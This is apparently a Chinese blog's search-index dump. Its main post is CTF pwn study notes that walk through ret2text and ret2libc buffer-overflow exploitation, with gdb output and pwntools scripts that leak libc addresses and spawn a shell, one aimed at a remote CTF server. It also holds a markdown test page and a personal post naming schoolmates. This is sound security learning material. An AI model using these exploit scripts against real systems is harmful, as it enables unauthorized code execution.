[ebp+secretcode].text:08048638 jnz short locret_8048646.text:0804863A mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641 call _system 在 secure 函数又发现了存在调用 system (&quot;/bin/sh&quot;) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。 下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。 行高亮123.text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets 可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下 行高亮1234567gef➤ b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.gef➤ rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf); ──────────────────────────────────────────────────────────────── 行高亮12345678910──────[ registers ]────$eax : 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 → 0x00000000$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebp : 0xffffcdc8 → 0x00000000$esi : 0xf7fae000 → 0x001b1db0$edi : 0xf7fae000 → 0x001b1db0$eip : 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; 可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 esp+0x1c，因此，我们可以推断 s 的地址为 0xffffcd5c s 相对于 ebp 的偏移为 0x6c s 相对于返回地址的偏移为 0x6c+4 最后的 payload 如下： 这种 x86 直接就是主函数中有输入函数，具体题目中二者区别不大，有时都能打通 行高亮1234567##!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2text&#x27;)target = 0x804863ash.sendline(&#x27;A&#x27; * (0x6c+4) + p32(target))sh.interactive() # 3.3x86 题解补充疑问（为什么加 p32 (0)）- 栈对齐 对于本题的函数传参，我们的栈帧构造初步想法如图 ebp ‘aaaa’ r return to func 参数一 “/bin/sh” 输入适量垃圾填充 padding * b 'a' 覆盖返回地址指向 func 函数 p32 (ret_addr) 参数 &quot;/bin/sh&quot; 地址 则 payload = padding*b'a' + p32 (ret_addr) + p32 (sh_addr) 然而这样的脚本在攻击时会出错。原因在于： 正常的函数调用 call 来达到 push eip；jmp 的作用，经过初步 payload 构造的攻击如下图所示，是通过覆盖 return 达到 jmp 的作用的，并没有像 call 一样 push eip 到栈中。 &lt;img src=&quot;https://gitee.com/murry_ari/murray/raw/master/images/image-20231108104555139.png&quot; alt=&quot;image-20231108104555139&quot; style=&quot;zoom:50%;&quot; /&gt; 故而 ret 执行后，ebp 后为我们输入的参数而非 eip 原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用 ret2text 覆盖 pwn 题时候，需要自行加入一行栈帧的填充。 &lt;img src=&quot;https://gitee.com/murry_ari/murray/raw/master/images/image-20231108104645809.png&quot; alt=&quot;image-20231108104645809&quot; style=&quot;zoom:50%;&quot; /&gt; # 三.ret2libc # I. 灵魂五问 1. 没有写 system 就一定没有 system？ 答：有 system， 在 libc 里面，别人写好的 2. 怎找到 libc 基地址 ？ 答：使用输出 libc 其中的函数地址，从而计算基地址 3. 怎么输出 libc 其中的函数地址？ 答：模仿程序如何找 libc 其中的函数地址的方式去寻找。 4. 怎把 GOT 表项内容打印出来。 答：利用输出函数泄露 got 表内容。 5. 怎么找到 system binsh 地址 答：利用偏移计算 常用会用到的指令： 行高亮123`readelf -a b|less # ROPgadget --binary 文件名 --only &quot;pop|ret&quot; #找特定gadget#寄存器ldd 文件名 #看动态链接 # II. 自己的理解 1. 我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点 ​ system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集 ​ 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 2. 那么如何得到 libc 中的某个函数的地址呢？ ​ 我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme https://github.com/lieanu/LibcSearcher 此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。 这里我们泄露 libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下 1. 泄露 libc_start_main 地址 2. 获取 libc 版本 3. 获取 system 地址与 /bin/sh 的地址 4. 再次执行源程序 5. 触发栈溢出执行 system (‘/bin/sh’)** # III. 解法举例 # 1)x64: # 0. 调用约定 64 位系统中使用寄存器传递参数：rdi、rsi、rdx、rcx、r8、r9（1-6 个参数） 参考：http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/ 要构造 write (1,buf2,20)，需要控制 3 个参数：rdi、rsi、rdx， 第 3 个参数代表输出的 size，如果没有 rdx 的 gadget 可以暂时不管，输出多少无所谓， 在下面我们构造 payload 的时候，我们不写第 3 个参数 # 0.1 举例 行高亮1234567891011当我们覆盖到rbp后回忆函数调用的流程，把rbp的下一个地址开始原来存的东西覆盖成我们想要的地址第一次： 第二次回到main----rbp(esp0-16)(ida-&gt;s)：覆盖完 ----同理----esp0-8(ida-&gt;r): &quot;pop_rdi_rsi_rdxret&quot; ----&quot;pop_rdi_ret&quot;----esp0: &quot;rdi&quot; &quot;1&quot; ----&quot;/bin/sh_addr&quot;----esp0+8: &#x27;pop_rsi_r15_ret&#x27; ----&quot;system_addr&quot; ----esp+16:&quot;leak_func_got&quot; 这次布栈就像ret_text中的system函数一样来布----esp+24:&quot;r15&quot; 8位可以是&quot;deadbeef&quot;----esp+32:&quot;泄露GOT真正地址的函数如write_sym&quot;----esp+40:&#x27;返回地址&#x27; # 1.padding 首先我们需要确定 padding，在哪里溢出，把这个空填满，溢出到 rbp 完 ----padding 和以前一样，看哪里 gets 或者 read 函数，这里其实就是 scanf ---- 可以通过 ida 或者动态调试得到 ---- 参考以前的题目，像 buuctf 前几道 rip,level.. # 2. 第一次溢出，目标获得的 libc 某个函数的真实地址 # 2.1 第一次溢出 比如：以下是 write 函数为例 行高亮1234567891011121314151617leak_func_name =&#x27;write&#x27; leak_func_got = elf.got[leak_func_name] # leak_func_got泄露的got表 去ida上看write的地址 #got.plt:0000000000404018 48 unk_404018 db 48h ; H OFF64 EXTDEF [extern,404048]=404048 (write)#leak_func_got = 404018return_addr = elf.symbols[&#x27;dofunc&#x27;]write_sym = elf.symbols[&#x27;write&#x27;]pop_rdi_ret = 0x4011fb #用ROPgadget查的pop_rsi_r15_ret = 0x4011f9#同上payload = b&#x27;a&#x27;* padding + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(leak_func_got) + p64(0xdeadbeef)# 产生溢出的字符串 pop_rdi_ret rdi存的值 pop_rsi_r15_ret leak_func_got泄露的got表 r15# 第一个参数 第二个参数（rdx第三个参数没有先不管）# 第一步 第2步rdi 【 第三步 plt表 】 第四步got表 第五步填deedbeef payload = payload + p64(write_sym) + p64(return_addr) # 第六步write偏移地址 第七步返回地址（进入第二次溢出的返回地址） delimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload) # 2.2 收获这个函数的真实地址 行高亮12345678910gets_addr=u64(p.recv()[:8]) #p.recv()[:8]: 这个部分是将从管道中接收到的数据的前 8 个字节切片出来。u64换成无符号整数#puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) # 接收puts的真实地址#p.recv(6): 从管道中接收 6 个字节的数据。.ljust(8, b&#x27;\\x00&#x27;): 对接收到的 6 个字节数据进行填充，#使其总长度为 8 字节，填充内容是 0x00 字节。以后可以不是6位#puts_addr=u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\0&#x27;)) #得到 puts 函数 的地址;#p.recvuntil(&#x27;\\n&#x27;): 从管道中接收数据，直到遇到换行符 \\n 为止。这个函数会将接收到的数据包括换行符在内全部返回。#[:-1]: 使用切片操作，去掉接收到的数据中的最后一个字符，即换行符 \\n。#.ljust(8, &#x27;\\0&#x27;): 将剩余的数据（不包括换行符）进行填充，使其总长度为 8 字节，填充内容是空字符 \\0。 # 3. 第二次溢出构造 payload2 # 3.1 获得基地址 行高亮12libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#本地调试，可用ldd查libc_base=gets_addr-libc.symbols[&quot;gets&quot;] # 得到基地址 # 3.2 算 system 和 binsh 地址 行高亮12system_addr=libc_base+libc.symbols[&quot;system&quot;]bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;)) 行高亮12345#远程版本libc=LibcSearcher(&quot;puts&quot;,puts_addr) # 得到 libc的版本;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # 得到基地址sys_addr=libc_base+libc.dump(&quot;system&quot;) # 利用偏移地址 得到 system函数的地址binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # 得到 bin/sh 的 地址 # 3.3 获取 shell 行高亮1234567payload2=offset*b&quot;B&quot;+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr) #64位三步走，和rettext一样一般会接收到程序本身的字符串后，再发送payloaddelimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload2)pause()io.interactive() # 2）x86: 最大区别是参数存放不用寄存器 # 0. 使用条件 ret2libc 的使用条件 泄漏 Libc 函数地址的条件：程序有输出函数，如 puts、printf、write；要输出函数的目的是要泄漏地址 实现：设置好输出函数的参数为某函数 GOT 表地址；GOT 表中保存已调用过的函数的真实地址 # 1. 核心 泄漏 ret2libc_32 任意一个函数的位置 获取 libc 的版本 根据偏移获取 shell 和 sh 的位置 执行程序获取 shell # 2. 内存分布，举例 ---esp --- ... --- buf ---ebp 栈帧 ---write@plt 返回地址 ---main @@@@@' 预留返回地址！！！！！！！！'@@@@ --- 1 write 函数参数一 (1) ---write_got 地址 write 函数参数二 (write_got 地址) --- 4 write 函数参数三 (写 4 字节) 32 位 --- 高地址，栈底 &lt;img src=&quot;https://gitee.com/murry_ari/murray/raw/master/images/image-20230816185520491.png&quot; alt=&quot;image-20230816185520491&quot; style=&quot;zoom:50%;&quot; /&gt; # 3. 第一次溢出，目标：找到一个函数地址 第一个以 write 为例子： 行高亮1234567write_plt=e.plt[&quot;write&quot;]write_got=e.got[&quot;write&quot;]main_addr=e.symbols[&quot;main&quot;]# char[88] ebp write函数参数一(1) write函数参数二(write_got地址)payload=0x88*b&#x27;a&#x27;+ p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1)+p32(write_got)+p32(4)# write函数返回地址 (返回到main函数) write函数参数三(写4字节)32位# 0x88*b&#x27;a&#x27;+ p32(0xdeadbeef)其实是char和ebp分开的，可以合起来算 ' 为什么加 1，加 4' 原因：write 函数本身有三个参数（1，'hello!',5） 函数说明：write () 会把参数 buf 所指的内存写入 count 个字节到参数 fd 所指的文件内。 返回值：如果顺利 write () 会返回实际写入的字节数（len）。当有错误发生时则返回 - 1，错误代码存入 errno 中。 //write(int fd, const void *buf, size_t count); 第一个参数 文件描述符 fd 1 输出，0 输入 第二个参数 无类型的指针 buf，可以存放要写的内容 第三个参数 写多少字节数 4 字节 下面再举一个：我们决定用泄露__libc_strart_main 的地址，来判定 libc 的版本 行高亮12345678#泄露地址puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]print &quot;leak libc_start_main_got addr and return to main again&quot;payload = flat([&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])#调用puts函数后，ret到main函数，用main函数里面的gets来获取libc_start的地址sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)gets_addr = u32(p.recv()) # 4. 第二次溢出，目标：直接获得 shell，像 rettext 一样 # 4.1 获得基地址 行高亮12libc = ELF(&quot;/lib32/libc.so.6&quot;) #获得libc版本号libc_base = gets_addr - libc.symbols[&quot;gets&quot;] # 4.2system 和 binsh 地址 行高亮12system_addr = libc_base + libc.symbols[&quot;system&quot;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;)) # 4.3 结束 行高亮123payload2 = padding*b&quot;A&quot; + p32(system_addr) + p32(0) + p32(bin_sh_addr) #32位两步走p.sendline(payload2)p.interactive() # 4.4 补充 大佬 1 号心得 ROP 中对 retlibc 技术的一些学习心得 漏洞利用思路： 1. 找到泄露库函数地址的漏洞，获取 libc 版本（因为一般不会给你 libc.so 文件） 查询 libc 版本一般有三种方法： 1.libcsearcher 库。在编写 exp 的时候用 from LibcSearcher import LibcSearcher 导入 通过 libc.dump ('system') 可以得到 system 函数的偏移，libc.dump ('str_bin_sh') 得到 binsh 字符串的偏移 2.pwntools 自带的 Dynelf，需要先构造一个 leak 函数和一个可以不断触发溢出的漏洞 一个模板： 行高亮12345678910def leak(address): #各种预处理 payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot; p.send(payload) #各种处理 data = p.recv(4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak, elf=ELF(&quot;./xxx&quot;)) #初始化DynELF模块 systemAddress = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) #在libc文件中搜索system函数的地址 3. 在线查询网站，通过函数的后三位数值查询。https://libc.blukat.me 典型的题目–adworld 里的 level1（非常典型的 retlibc） 源码： 行高亮12345678910111213141516171819202122232425262728293031323334353637383940414243ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] printf(&quot;What&#x27;s this:%p?\\n&quot;, &amp;buf); return read(0, &amp;buf, 0x100u); //溢出点&#125;exp：from pwn import *from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#sh = process(&#x27;./level1&#x27;)sh=remote(&#x27;111.198.29.45&#x27;,42536)writeplt= 0x08048370readgot=0x0804A00Cvuln=0x0804847Bpayload = &#x27;a&#x27;*0x8c+p32(writeplt)+p32(vuln)+p32(1)+p32(readgot)+p32(4)#gdb.attach(sh)sh.sendline(payload)readaddr=u32(sh.recv(4))print(hex(readaddr))libc = LibcSearcher(&#x27;read&#x27;, readaddr)libcbase = readaddr - libc.dump(&#x27;read&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload=&#x27;a&#x27;*0x8c+p32(system_addr)+&#x27;a&#x27;*4+p32(binsh_addr)sh.sendline(payload)sh.interactive()sh.close() 笔记: context.log_level='debug’开启调试模式； 大佬原文链接：https://blog.csdn.net/qq_41706924/article/details/89607683","path":"CTF/Pwn/note/Pwn1/","date":"11-08","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Pwn概述","text":"&lt;EMBED src=&quot;http://www.clocklink.com/Clocks/0001P-Orange.swf?Place=Beijing China&amp;TimeZone=GMT0800&quot; width=200 height=200 type=application/x-shockwave-flash wmode=&quot;transparent&quot;&gt; &lt;p&gt;&lt;b &gt; 今日天气 &lt;/b&gt;&lt;br&gt;&lt;FONT face=&quot;宋体&quot;&gt;&lt;center&gt;&lt;iframe width=&quot;175&quot; height=&quot;250&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; src='http://www.nmc.gov.cn/fcst6.php'&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/FONT&gt; # 0X01 Pwn 简介 # 软件安全：软件安全专注于研究软件的设计和实现的安全 研究对象：代码（源码、字节码、汇编等） 研究目标：发掘漏洞、利用漏洞、修补漏洞 研究技术：逆向工程、漏洞挖掘与利用、漏洞防御技术 CTF PWN：软件安全研究的一个缩影 # 研究对象：可执行文件，主要是 ELF 文件 研究最终目标：夺取 Flag 软件安全与 CTF PWN 特点：入门难、进阶难、精通难。 # 工具： 静态分析：IDA Pro 动态调试：gdb (with peda or gef)、windbg、ollydbg Exploit：pwntools、zio # 前置技能： 汇编语言：程序执行、函数栈帧、函数调用等 编译、链接、装载、执行 ELF 文件结构 Linux 系统相关：文件描述符、系统调用、socket 编程、shell 命令 编译原理，操作系统，计算机组成原理 # 0X02 PWN 学习方法 # 学习阶段一：学习套路 套路是有限的，假以时日一定会学完的招式 针对每种套路都练习 1~2 道习题 学习完所有常见套路，大多数国内比赛的中档题基本都可以随便切 # 学习阶段二：总结套路，变套路为艺术 漏洞利用是一门艺术，难以用套路完全概况，要想切难题不能全靠套路 多刷刷国际赛的难题，刷的慢没关系，刷多了自然就会融会贯通 多总结思考现有的套路的本质 # 资源： CTF Writeup Github：https://github.com/ctfs 聚合了各大国际比赛的习题文件以及 writeup Googling:XXX writeup or XXX CTF 百度收录不了 github pages 0X03 PWN 学习案例 ROP： 1、ROP：现代栈溢出中最基础的利用技术（最简单最基础的套路） 2、Googling 筛选到比较好的题目：r0pbaby 学习 writeup，可以参考多篇 writeup，根据 writeup 和学到的内容自己动手调试一下，尽量自己动手重写 EXP 重写 EXP 成功：基本掌握了 ROP。 第二章 CTF 中漏洞挖掘的方法论：从逆向工程到漏洞挖掘 0X01 逆向工程简介 对于 PWN 来说，逆向工程的主要作用为发掘与分析漏洞 工具： 静态分析工具：IDA pro 动态调试工具：gdb、windbg、ollydbg、IDA Pro IDA pro 的 F5 大法 0X02 常见漏洞简介 在进行漏洞挖掘之前，必须对常见漏洞非常熟悉！！！ 缓冲区溢出（Buffer Overflow） 堆溢出、栈溢出、bss 溢出、data 溢出（通常覆盖指针） wellpwn、AliCTF 2016 vss、Hitcon 2015 readable、stkof、zerostorage 整数溢出（Integer Overflow） 无符号型与有符号的转换（MMACTF 2016 shadow） 整数加减乘除法，如 malloc (size*2) (pwnhub.cn calc) 整数溢出通常会进一步转换为缓冲区溢出、逻辑漏洞等其他漏洞 格式化字符串（Format String） printf (s)、sprintf (s)、fprintf (s) 等，可能导致任意地址读写（MMACTF 2016 greeting） 可以用来 leak（HCTF2016 fheap） 释放后使用（Use-After-Free） 释放掉的内存可能会被重新分配，释放后使用会导致重新分配的内存被旧的使用所改写 Double free 是一种特殊的 UAF Defcon 2014 Qualifier shitsco、AliCTF 2016 router、0CTF2016 freenote（double free）、HCTF2016 fheap（double free） 逻辑漏洞 访问控制、协议漏洞、多线程竞态条件（fake fuzz）等 0X03 漏洞挖掘中的逆向技巧 关键数据结构分析：还原结构体、接口、类等 控制流分析：理清楚程序的执行逻辑，基本要做到从反汇编代码到源码的还原 数据流分析：理清楚数据的流向 CTF 漏洞挖掘中的分析策略： 目标文件较小时，通常采用对整个目标文件进行控制流分析，做到整个程序从反汇编代码到接近源码级别的还原，还原的同时查找漏洞 目标文件较大时，逆向整个文件所需工作量太大，通常需要额外的关注数据流，并理清楚数据流所经之处的控制流，因为漏洞的触发与数据流离不开关系 无论是数据流分析和控制流分析，还原结构体、接口、类都会促进逆向工程 控制流分析的主要作用是理清楚程序的逻辑，对于规模较小的目标文件，一般选择理清整个目标文件。 代码以识别为主，不要硬逆。 善用标记，标记结构体、标记变量名、标记变量类型 F5 大法好，但是 F5 不是万能的，当发现 F5 结果比较诡异时需要在汇编层分析（如 mmactf 2016 shadow） 数据流分析 目标文件较大，全盘逆向不现实 追溯用户输入的走向，重点关注对用户输入数据处理的函数 可以在不用逆清楚控制流即可找到漏洞，需要一定的技巧性 （plaid CTF 2015 datastore） 原文链接：https://blog.csdn.net/prettyX/article/details/103173220","path":"CTF/Pwn/note/PWN概述/","date":"11-05","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Markdown Style test","text":"This post is originated from here and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly. # Headers 行高亮1234567891011121314# H1## H2### H3#### H4##### H5###### H6Alternatively, for H1 and H2, an underline-ish style:Alt-H1======Alt-H2------ # H1 # H2 # H3 # H4 # H5 # H6 Alternatively, for H1 and H2, an underline-ish style: # Alt-H1 # Alt-H2 # Emphasis 行高亮1234567Emphasis, aka italics, with *asterisks* or _underscores_.Strong emphasis, aka bold, with **asterisks** or __underscores__.Combined emphasis with **asterisks and _underscores_**.Strikethrough uses two tildes. ~~Scratch this.~~ Emphasis, aka italics, with asterisks or underscores. Strong emphasis, aka bold, with asterisks or underscores. Combined emphasis with asterisks and underscores. Strikethrough uses two tildes. Scratch this. # Lists 行高亮123456789101112131415161718192021221. First ordered list item2. Another item * Unordered sub-list.1. Actual numbers don&#x27;t matter, just that it&#x27;s a number 1. Ordered sub-list4. And another item. You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we&#x27;ll use three here to also align the raw Markdown). To have a line break without a paragraph, you will need to use two trailing spaces. Note that this line is separate, but within the same paragraph. (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)* Unordered list can use asterisks- Or minuses+ Or pluses- Paragraph In unordered list For example like this.Common Paragraph with some text.And more text. First ordered list item Another item Unordered sub-list. Actual numbers don't matter, just that it's a number Ordered sub-list And another item. You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we'll use three here to also align the raw Markdown). To have a line break without a paragraph, you will need to use two trailing spaces. Note that this line is separate, but within the same paragraph. (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.) Unordered list can use asterisks Or minuses Or pluses Paragraph In unordered list For example like this. Common Paragraph with some text. And more text. # Inline HTML 行高亮1&lt;p&gt;To reboot your computer, press &lt;kbd&gt;ctrl&lt;/kbd&gt;+&lt;kbd&gt;alt&lt;/kbd&gt;+&lt;kbd&gt;del&lt;/kbd&gt;.&lt;/p&gt; &lt;p&gt;To reboot your computer, press &lt;kbd&gt;ctrl&lt;/kbd&gt;+&lt;kbd&gt;alt&lt;/kbd&gt;+&lt;kbd&gt;del&lt;/kbd&gt;.&lt;/p&gt; 行高亮1234567&lt;dl&gt; &lt;dt&gt;Definition list&lt;/dt&gt; &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt; &lt;dt&gt;Markdown in HTML&lt;/dt&gt; &lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;&lt;/dl&gt; &lt;dl&gt; &lt;dt&gt;Definition list&lt;/dt&gt; &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt; 行高亮12&lt;dt&gt;Markdown in HTML&lt;/dt&gt;&lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt; &lt;/dl&gt; # Links 行高亮1234567891011121314151617[I&#x27;m an inline-style link](https://www.google.com)[I&#x27;m an inline-style link with title](https://www.google.com &quot;Google&#x27;s Homepage&quot;)[I&#x27;m a reference-style link][Arbitrary case-insensitive reference text][I&#x27;m a relative reference to a repository file](../blob/master/LICENSE)[You can use numbers for reference-style link definitions][1]Or leave it empty and use the [link text itself]Some text to show that the reference links can follow later.[arbitrary case-insensitive reference text]: https://hexo.io[1]: https://hexo.io/docs/[link text itself]: https://hexo.io/api/ I'm an inline-style link I'm an inline-style link with title I'm a reference-style link I'm a relative reference to a repository file You can use numbers for reference-style link definitions Or leave it empty and use the link text itself Some text to show that the reference links can follow later. # Images 行高亮12345678910hover to see the title text:Inline-style:![alt text](https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 1&quot;)Reference-style:![alt text][logo][logo]: https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 2&quot; hover to see the title text: Inline-style: Reference-style: # Code and Syntax Highlighting Inline code has back-ticks around it. 12var s = &quot;JavaScript syntax highlighting&quot;;alert(s); 12s = &quot;Python syntax highlighting&quot;print s 12No language indicated, so no syntax highlighting.But let&#x27;s throw in a &lt;b&gt;tag&lt;/b&gt;. # Tables 行高亮12345| |ASCII |HTML ||----------------|-------------------------------|-----------------------------||Single backticks|`&#x27;Isn&#x27;t this fun?&#x27;` |&#x27;Isn&#x27;t this fun?&#x27; ||Quotes |`&quot;Isn&#x27;t this fun?&quot;` |&quot;Isn&#x27;t this fun?&quot; ||Dashes |`-- is en-dash, --- is em-dash`|-- is en-dash, --- is em-dash| ASCII HTML Single backticks 'Isn't this fun?' 'Isn't this fun?' Quotes &quot;Isn't this fun?&quot; &quot;Isn't this fun?&quot; Dashes -- is en-dash, --- is em-dash -- is en-dash, --- is em-dash Colons can be used to align columns. 行高亮12345| Tables | Are | Cool || ------------- |:-------------:| -----:|| col 3 is | right-aligned | || col 2 is | centered | || zebra stripes | are neat | Tables Are Cool col 3 is right-aligned col 2 is centered zebra stripes are neat The outer pipes ( ) are optional, and you don't need to make the raw Markdown line up prettily. You can also use inline Markdown. 行高亮1234Markdown | Less | Pretty--- | --- | ---*Still* | `renders` | **nicely**1 | 2 | 3 Markdown Less Pretty Still renders nicely 1 2 3 You can find more information about LaTeX mathematical expressions here. # Blockquotes Blockquotes are very handy in email to emulate reply text. This line is part of the same quote. Quote break. This is a very long line that will still be quoted properly when it wraps. Oh boy let's keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can put Markdown into a blockquote. # Horizontal Rule Three or more... 行高亮1234567891011---Hyphens***Asterisks___Underscores Hyphens Asterisks Underscores # Line Breaks 行高亮123456Here&#x27;s a line for us to start with.This line is separated from the one above by two newlines, so it will be a *separate paragraph*.This line is also a separate paragraph, but...This line is only separated by a single newline, so it&#x27;s a separate line in the *same paragraph*. Here's a line for us to start with. This line is separated from the one above by two newlines, so it will be a separate paragraph. This line is also a separate paragraph, but... This line is only separated by a single newline, so it's a separate line in the same paragraph. 行高亮123456789This is a regular paragraph.&lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;This is another regular paragraph. This is a regular paragraph. &lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; This is another regular paragraph. # Youtube videos 行高亮1234567&lt;a href=&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot;alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt;Pure markdown version:[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/ARted4RniaU/0.jpg)](https://www.youtube.com/watch?v=ARted4RniaU) &lt;a href=&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU &quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot; alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt; Pure markdown version:","path":"markdown/","date":"11-04","excerpt":"This post is originated from here and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly.","tags":[{"name":"Foo","slug":"Foo","permalink":"http://example.com/tags/Foo/"},{"name":"Bar","slug":"Bar","permalink":"http://example.com/tags/Bar/"}]},{"title":"我的第一篇博客","text":"# 写在前面 总觉得生活里缺少点什么，就以此来填充一下我的枯燥生活吧。 当然啦，衷心地祝福每一个到访本博客的人，你们都是我的好盆友！好基友！ hhhhh！感谢你们😘😘😘 当然这个博客，也是在学习了很多大佬的博客，兼容并蓄，哈哈哈，正好自己也是一个段子手，喜欢写一点东西。 另外，这里可以是我大学生活的一个记录吧，好啦，与君共勉。 接下来对本博客进行一个简单的介绍，作为一个开篇，嘿嘿。 # 博客功能 学习记录，生活记录等等，，，，，，，做笔记 # 笔者自介 接下来简单自报家门嘞，很久以前觉得自己的人生真的是 “丰富多彩”，哈哈，经历过很多吧，笨人记忆力还好（++ 现在还记得高考的每个科目的每道题 bushi ++{.dot .warning}），甚至想写自专，想法很好，现实骨感。 # 我的现在 学业上现在正在川大攻读网络空间安全与法学双学士学位，痛并快乐着。 生活里热爱人际交往 ，即兴演讲， 吹牛搞怪 。另外是打游戏糕手，，比如农药、元神、CF、森林、MC.... 拿王者荣耀来说吧，国服不至于，金标还是有过，元歌代言人，所以有好玩的游戏记得推我。还有是个军事迷，研究国际政治（尬黑一下，仅仅是很爱看，谈不上研究），同时喜欢看各种离奇变态杀人案，建国以来的国内外几乎看过一遍，对于小说喜欢看怪谈和推理文，其余没多大兴趣，有时犯瘾会看看爽文和言情。 技术上热衷计算机技术，数学（显然数学很菜又想学，高考 107，铭记 107，但 96 个志愿里有 43 个数学专业），热衷玩机技术，黑客技术（着迷但很菜） 运动上，渴望成为猛男（），停留在渴望。曾经羽毛球打得还行，能和高中的（渣男）打几个来回，现在打网球、排球、羽毛球。 # 我的故事 （害怕忘记，选择记录）（以下人名除了小学外的均做了一定处理和征得本人同意） **--- 小学：** 小时候在广东待了 10 年，粤语一般般，我指的是潮汕话，潮汕的朋友可以找我搓饭，最爱吃肠粉，有个从小到大的小弟刘弟毛。 印象深刻的人：是很高的潘书婷，学习超牛的邓灿炫，经常打人的郑伟超，教师子女的郑伟钊，住在隔壁的吴宗霖，，，，就记得这么多，也没联系过了，老师也是一年一换，印象不深刻。 